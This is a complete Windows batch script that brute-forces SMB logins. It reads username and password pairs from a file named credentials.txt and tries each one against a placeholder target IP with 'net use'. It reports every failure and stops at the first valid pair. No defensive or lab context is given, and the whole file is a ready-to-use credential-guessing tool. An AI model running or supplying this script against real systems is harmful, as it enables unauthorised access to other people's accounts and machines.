@echo off
setlocal enabledelayedexpansion

:: Set the target IP here
set "target_ip=<target_ip>"

for /f "tokens=1,2" %%i in (credentials.txt) do (
    echo Testing username: %%i / password: %%j...
    net use \\%target_ip% %%j /user:%%i >nul 2>&1

    if !errorlevel! equ 0 (
        echo [SUCCESS] Valid credentials found: %%i / %%j
        exit /b 0
    ) else (
        echo [FAILED] Invalid credentials: %%i / %%j
    )
)

echo All combinations failed
exit /b 1
